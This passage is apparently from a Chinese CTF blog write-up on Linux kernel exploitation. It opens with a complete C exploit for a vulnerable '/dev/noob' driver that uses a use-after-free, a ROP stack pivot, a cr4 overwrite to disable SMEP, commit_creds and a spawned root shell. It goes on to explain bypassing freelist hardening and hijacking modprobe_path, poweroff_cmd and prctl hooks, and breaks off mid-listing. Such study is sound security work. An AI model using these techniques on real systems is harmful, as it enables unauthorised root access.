class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_CMD  0x30000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEL_CMD  0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_CMD 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_CMD 0x30003</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> *buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="built_in">size</span>;</span><br><span class="line">&#125; arg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.<span class="built_in">size</span> = <span class="built_in">size</span>;</span><br><span class="line">    ioctl(fd, ADD_CMD, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> *buf, <span class="keyword">uint64_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    arg.<span class="built_in">size</span> = <span class="built_in">size</span>;</span><br><span class="line">    ioctl(fd, EDIT_CMD, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> *buf, <span class="keyword">uint64_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    arg.<span class="built_in">size</span> = <span class="built_in">size</span>;</span><br><span class="line">    ioctl(fd, SHOW_CMD, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    ioctl(fd, DEL_CMD, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> prepare_kernel_cred = <span class="number">0xffffffff810ad7e0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds = <span class="number">0xffffffff810ad430</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">privilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *(*pkc)(<span class="keyword">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">void</span> *) = commit_creds;</span><br><span class="line"></span><br><span class="line">    cc(pkc(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> user_cs, user_sp, user_ss, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*] status saved"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[!] root!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[!] failed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swapgs_iretq</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"swapgs;"</span></span><br><span class="line">            <span class="string">"iretq;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">"/dev/noob"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[!] open failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create seq_operations(0x20)</span></span><br><span class="line">    <span class="keyword">int</span> seq_fd = <span class="built_in">open</span>(<span class="string">"/proc/self/stat"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(seq_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[!] open failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// verify seq_operations-&gt;start</span></span><br><span class="line">    show(<span class="number">0</span>, buf, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] function start address is: %p\n"</span>, buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// gadgets</span></span><br><span class="line">    <span class="keyword">uint64_t</span> xchg_eax_esp = <span class="number">0xffffffff811ac368</span>; <span class="comment">// xchg eax, esp; ret;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> pop_rdi = <span class="number">0xffffffff8107f460</span>;      <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> mov_cr4_rdi = <span class="number">0xffffffff8101f2f0</span>;  <span class="comment">// mov cr4, rdi; pop rbp; ret;  </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack pivot</span></span><br><span class="line">    <span class="keyword">uint64_t</span> *fake_stack = mmap(xchg_eax_esp &amp; <span class="number">0xfffff000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fake_stack != (xchg_eax_esp &amp; <span class="number">0xfffff000</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[!] mmap failed"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> base = (xchg_eax_esp &amp; <span class="number">0xfff</span>) / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> index = <span class="number">0</span>;</span><br><span class="line">    fake_stack[base + index++] = pop_rdi;</span><br><span class="line">    fake_stack[base + index++] = <span class="number">0x6f0</span>;</span><br><span class="line">    fake_stack[base + index++] = mov_cr4_rdi;</span><br><span class="line">    fake_stack[base + index++] = <span class="number">0</span>;</span><br><span class="line">    fake_stack[base + index++] = (<span class="keyword">uint64_t</span>)privilege;</span><br><span class="line">    fake_stack[base + index] = (<span class="keyword">uint64_t</span>)swapgs_iretq;</span><br><span class="line">    fake_stack[base + index++] += <span class="number">8</span>;</span><br><span class="line">    fake_stack[base + index++] = (<span class="keyword">uint64_t</span>)getshell;</span><br><span class="line">    fake_stack[base + index++] = user_cs;</span><br><span class="line">    fake_stack[base + index++] = user_rflags;</span><br><span class="line">    fake_stack[base + index++] = user_sp;</span><br><span class="line">    fake_stack[base + index++] = user_ss;</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = xchg_eax_esp;</span><br><span class="line">    edit(<span class="number">0</span>, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(seq_fd, arg.buf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改内核中的全局变量"><a href="#修改内核中的全局变量" class="headerlink" title="修改内核中的全局变量"></a>修改内核中的全局变量</h3><p>我们通常会想，如果能得到内核任意地址读写的权限，怎么做才能最快最好地提权，或者说以root权限执行任意命令。实际上，最为直接也可能是最为高效的方法，就是找全局变量下手，事实上某些全局变量一旦被劫持，确实可以达到极其强大的效果。</p><p>首先照样从这道题目出发，我们首先要得到一个任意地址读写的能力，看似有了UAF，以及没有开kaslr保护，这会很容易。然而，注意到内核是开了SLAB_FREELIST_HARDENED的保护，并且无kaslr并不代表每次拿到的object地址也是可预测的。</p><p>首先来干件大事，把<code>random</code>算出来，看似不知道object的地址是没法准确算出<code>random</code>的，但是实际上并非如此（虽然这里发现<code>random</code>貌似都对不起这个名字，因为在我的环境下，它保持一个常值不变），即使它真的”random”，我们也能算出来。</p><p>考虑以下三种<code>freelist</code>的组织情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">freelist:</span><br><span class="line">pool[<span class="number">1</span>] ==&gt; pool[<span class="number">0</span>] ==&gt; ...</span><br><span class="line">Therefore: pool[<span class="number">1</span>]-&gt;fd = <span class="built_in">random</span> ^ &amp;pool[<span class="number">1</span>] ^ &amp;pool[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">freelist:</span><br><span class="line">pool[<span class="number">2</span>] ==&gt; pool[<span class="number">0</span>] ==&gt; ...</span><br><span class="line">Therefore: pool[<span class="number">2</span>]-&gt;fd = <span class="built_in">random</span> ^ &amp;pool[<span class="number">2</span>] ^ &amp;pool[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">freelist:</span><br><span class="line">pool[<span class="number">1</span>] ==&gt; pool[<span class="number">2</span>] ==&gt; pool[<span class="number">0</span>] ==&gt; ...</span><br><span class="line">Therefore: pool[<span class="number">1</span>]-&gt;fd = <span class="built_in">random</span> ^ &amp;pool[<span class="number">1</span>] ^ &amp;pool[<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>那么将上述三个值进行异或，我们就能得到<code>random</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">random</span> ^ &amp;pool[<span class="number">1</span>] ^ &amp;pool[<span class="number">0</span>]) ^ (<span class="built_in">random</span> ^ &amp;pool[<span class="number">2</span>] ^ &amp;pool[<span class="number">0</span>]) ^ (<span class="built_in">random</span> ^ &amp;pool[<span class="number">1</span>] ^ &amp;pool[<span class="number">2</span>]) = <span class="built_in">random</span>;</span><br></pre></td></tr></table></figure><p>遗憾的是，得到<code>random</code>并不代表我们能算到object的地址，但是既然这是一个nokaslr的内核，就有nokaslr的做法。<br>调试过程中我们注意到，object的地址高5 bytes保持不变，且符合<code>0xffff880005000000 - 0xffff880007000000</code>的范围，只要想办法爆破出任意一个object的低3 bytes，我们就能顺利地任意地址读写了。<br>而我的方法就是，既然我计算出了<code>random</code>，也知道高5 bytes相对稳定不变，那么只要控制<code>fd = random ^ 0xffff880000000000</code>，那么在计算<code>next_free_object</code>的地址的时候，得到<code>random ^ (random ^ 0xffff880000000000) ^ 0xffff88000xxxxxxx) = 0x000000000xxxxxxx)</code>，这显然落在用户空间内了。<br>只要相应地在用户空间内<code>mmap</code>大小为<code>0x2000000</code>内存，就可以成功<code>kmalloc</code>到用户空间，这个时候随意写入一个标志值，然后再在这块<code>mmap</code>区域进行搜索，定位到地地址就是目标object的低4 bytes，这样，我们就获得一个object的地址。</p><p><strong>这里再引入一个坑点：</strong></p><blockquote><p>通常情况下，不考虑HARDENED的情况，我们劫持<code>object-&gt;fd</code>指向任意地址，就能<code>kmalloc</code>到目标区域，达到任意地址读写的目的，虽然后续可能发生crash，但一般来说都是kernel内部发生的一些未预期的<code>kmalloc</code>试图从崩坏的<code>freelist</code>获取object。<br>然而在本题中，即使将<code>object-&gt;fd</code>加密并劫持，也极易crash，甚至在第一次<code>kmalloc</code>就crash，也就是说，根本无法正常得到目标地址区域的内存。<br>这里有两个原因：<br>一个是因为fd的加密，导致指向的目标地址（伪造的object）的fd经过解密之后不可能（在没有伪造数据的前提下）是0，即freelist并不会把它当作最后一个object。<br>还有一个原因，也是最重要的，在IDA反编译的代码中发现，<code>kmalloc</code>中的<code>prefetch</code>行为发生了微妙的变化，即从：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall _kmalloc(<span class="keyword">unsigned</span> __int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = __readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)*v4 + <span class="number">8</span>);</span><br><span class="line">    v6 = __readgsqword(<span class="number">0xF138</span>u) + *v4;</span><br><span class="line">    v7 = *(__int64 **)v6;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_QWORD *)(v6 + <span class="number">16</span>) || !v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = v4;</span><br><span class="line">      v13 = sub_FFFFFFFF81242240(v4, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a2, <span class="number">0xFFFFFFFF</span>LL, retaddr);</span><br><span class="line">      v7 = (__int64 *)v13;</span><br><span class="line">      v4 = v15;</span><br><span class="line">      <span class="keyword">if</span> ( !(a2 &amp; <span class="number">0x8000</span>) || !v13 )</span><br><span class="line">        <span class="keyword">return</span> (__int64)v7;</span><br><span class="line">LABEL_16:</span><br><span class="line">      sub_FFFFFFFF81987700(v7, <span class="number">0</span>, *((<span class="keyword">int</span> *)v4 + <span class="number">7</span>));</span><br><span class="line">      <span class="keyword">return</span> (__int64)v7;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = v4[<span class="number">40</span>] ^ *(__int64 *)((<span class="keyword">char</span> *)v7 + *((<span class="keyword">int</span> *)v4 + <span class="number">8</span>)) ^ ((<span class="keyword">unsigned</span> &gt; __int64)v7 + *((<span class="keyword">int</span> *)v4 + <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !(<span class="keyword">unsigned</span> __int8)sub_FFFFFFFF81984E70(*v4, *v4, v5, v5 + <span class="number">1</span>) );</span><br><span class="line">  <span class="keyword">if</span> ( v9 != v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    _RBX = v4[<span class="number">40</span>] ^ *(_QWORD *)(*((<span class="keyword">int</span> *)v4 + <span class="number">8</span>) + v8) ^ (*((<span class="keyword">int</span> *)v4 + <span class="number">8</span>) + v8);</span><br><span class="line">    __asm &#123; prefetcht0 <span class="keyword">byte</span> ptr [rbx] &#125; <span class="comment">// ========== here ========== //</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变化为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall _kmalloc(<span class="keyword">unsigned</span> __int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">if</span> ( _s &amp;&amp; !v4 )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">     &#123;</span><br><span class="line">       slab_offset = __readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)*_s + <span class="number">8</span>);</span><br><span class="line">       obj = *(_QWORD *)(__readgsqword(<span class="number">0xF138</span>u) + *_s);</span><br><span class="line">       <span class="keyword">if</span> ( !obj )</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       _RBX = *(_QWORD *)(obj + *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)_s + <span class="number">8</span>));</span><br><span class="line">       <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)this_cpu_cmpxchg16b_emu(*_s, *_s, slab_offset, &gt;&gt;  b_offset + <span class="number">1</span>) )</span><br><span class="line">       &#123;</span><br><span class="line">         _RAX = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)_s + <span class="number">8</span>);</span><br><span class="line">         __asm &#123; prefetcht0 <span class="keyword">byte</span> ptr [rbx+rax] &#125; <span class="comment">// ========== here ========== //</span></span><br><span class="line">         <span class="keyword">if</span> ( !(flags &amp; <span class="number">0x8000</span>) )</span><br><span class="line">           <span class="keyword">return</span> _ret_obj;</span><br><span class="line">         <span class="keyword">return</span> _memset(_ret_obj, <span class="number">0</span>, *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)_s + <span class="number">7</span>));</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     ...</span><br><span class="line">   &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果抛开异或操作不看的话，可以看出，虽然两者都对<code>next_next_free_object</code>进行了<code>prefetch</code>的操作，但不同之处在于，一个是先计算而另一个不是。看似影响不大实则似乎引入了一个问题，就是考虑到伪造的object在这个代码环境下是作为<code>free_object</code>存在的，其<code>next_free_object</code>是一个非法地址，如果不去访问其中的内容或者只是在<code>prefetch</code>中访问是不会带来crash问题的；但是如果访问了其中内容即访问了非法地址，crash就不难理解了。<br>所以在调试的过程中，这个问题引发的crash让我怀疑人生，这里同样需要绕过。</p></blockquote><p>所以我的解决方案是，内核搞不定的，全都搞到用户空间里。<br>即可以伪造一个object1，使其落在用户空间内（地址为<code>random &gt;&gt; 32</code>），且可以通过计算使得在地址偏移4 bytes得时候，伪造新的object2落在<code>pool[idx] - 4</code>的位置处，使得其本身地址满足形式<code>random &gt;&gt; 32 &lt;&lt; 32</code>，从而使得<code>random ^ (random &gt;&gt; 32 &lt;&lt; 32)</code>继续落在用户空间内，这样就可以通过在用户空间内伪造fd，使得<code>next_next_free_object</code>为0，成功bypass。</p><p>这样下来，我们才算完成了通过上述的object1完成任意地址读写的能力。</p><p>由于我们的攻击方法基于修改内核空间中的全局变量，这里给出两个，分别是：</p><ul><li><code>modprobe_path</code>：原值为”/sbin/modprobe”，一条触发路径是在执行某未知格式的文件时，依次调用到<code>call_modprobe</code>，作用是以root的权限执行<code>modprobe_path</code>指向的路径。如果能够劫持为我们的恶意脚本，那么就能实现以root权限执行任意命令。</li><li><code>poweroff_cmd</code>：原值为”/sbin/poweroff”，一条触发路径是通过<code>orderly_poweroff</code>调用，同样是root权限执行。稍显麻烦的地方在于，需要劫持控制流到<code>orderly_poweroff</code>执行。</li><li>此外还有许多其他可利用的全局变量，但作用和目的大多类似，这里不再列举，可自行搜索。</li></ul><p>如果利用<code>orderly_poweroff</code>的方法，由于需要劫持控制流，如果网上搜索的话，会经常看见一个叫做”Hijack Prctl<code>的方法。具体地来说就是如果在用户态调用</code>prctl`系统调用，会执行以下路径：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line"><span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line"><span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> thisrc;</span><br><span class="line"><span class="keyword">int</span> rc = -ENOSYS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">hlist_for_each_entry(hp, &amp;security_hook_heads.task_prctl, <span class="built_in">list</span>) &#123;</span><br><span class="line">thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5); <span class="comment">// === hook function here === //</span></span><br><span class="line"><span class="keyword">if</span> (thisrc != -ENOSYS) &#123;</span><br><span class="line">rc = thisrc;</span><br><span class="line"><span class="keyword">if</span> (thisrc != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以只要劫持<code>hp-&gt;hook</code>，然后调用<code>prctl(...)</code>就可以劫持控制流了。</p><p><strong>这里再来一个坑点：</strong></p><blockquote><p>利用任意读写改<code>hp-&gt;hook</code>的时候，发现竟然直接crash了，而且正是写入的时候crash了。<br>如果查看一下这部分<code>hook</code>的权限，就能发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> <span class="title">capability_hooks</span>[] __<span class="title">lsm_ro_after_init</span> = &#123;</span></span><br><span class="line">LSM_HOOK_INIT(capable, cap_capable),</span><br><span class="line">LSM_HOOK_INIT(settime, cap_settime),</span><br><span class="line">LSM_HOOK_INIT(ptrace_access_check, cap_ptrace_access_check),</span><br><span class="line">LSM_HOOK_INIT(ptrace_traceme, cap_ptrace_traceme),</span><br><span class="line">LSM_HOOK_INIT(capget, cap_capget),</span><br><span class="line">LSM_HOOK_INIT(capset, cap_capset),</span><br><span class="line">LSM_HOOK_INIT(bprm_set_creds, cap_bprm_set_creds),</span><br><span class="line">LSM_HOOK_INIT(inode_need_killpriv, cap_inode_need_killpriv),</span><br><span class="line">LSM_HOOK_INIT(inode_killpriv, cap_inode_killpriv),</span><br><span class="line">LSM_HOOK_INIT(inode_getsecurity, cap_inode_getsecurity),</span><br><span class="line">LSM_HOOK_INIT(mmap_addr, cap_mmap_addr),</span><br><span class="line">LSM_HOOK_INIT(mmap_file, cap_mmap_file),</span><br><span class="line">LSM_HOOK_INIT(task_fix_setuid, cap_task_fix_setuid),</span><br><span class="line">LSM_HOOK_INIT(task_prctl, cap_task_prctl),</span><br><span class="line">LSM_HOOK_INIT(task_setscheduler, cap_task_setscheduler),</span><br><span class="line">LSM_HOOK_INIT(task_setioprio, cap_task_setioprio),</span><br><span class="line">LSM_HOOK_INIT(task_setnice, cap_task_setnice),</span><br><span class="line">LSM_HOOK_INIT(vm_enough_memory, cap_vm_enough_memory),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个<code>__lsm_ro_after_init</code>存在大问题，如果把提取出来的vmlinux放到IDA中分析，也能发现这个<code>hp-&gt;hook</code>它在<code>.rodata</code>段中，根本没法改。<br>那为什么这方法这么流行？<br>后面找了个4.4的内核，才发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 